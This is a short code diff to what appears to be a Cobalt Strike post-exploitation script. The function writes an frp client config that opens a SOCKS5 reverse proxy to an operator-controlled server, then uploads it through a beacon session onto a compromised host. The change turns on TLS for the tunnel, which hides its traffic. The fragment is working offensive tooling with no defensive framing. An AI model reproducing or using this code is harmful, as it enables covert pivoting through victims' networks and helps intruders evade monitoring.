@@ -1,6 +1,6 @@
 sub FRP {
     $out = openf(">".script_resource("frpc/frpc.ini"));
-    writeb($out, "[common]\nserver_addr=".$3['IP']."\nserver_port=".$3['PORT']."\n[http_proxy]\ntype = tcp\nremote_port = ".$3['PPORT']."\nplugin = socks5");
+    writeb($out, "[common]\nserver_addr=".$3['IP']."\nserver_port=".$3['PORT']."\ntls_enable = true\n[http_proxy]\ntype = tcp\nremote_port = ".$3['PPORT']."\nplugin = socks5");
     closef($out);
     bcd($bid, $3['UploadPath']);
     bupload($bid, script_resource("frpc/frpc.ini"));
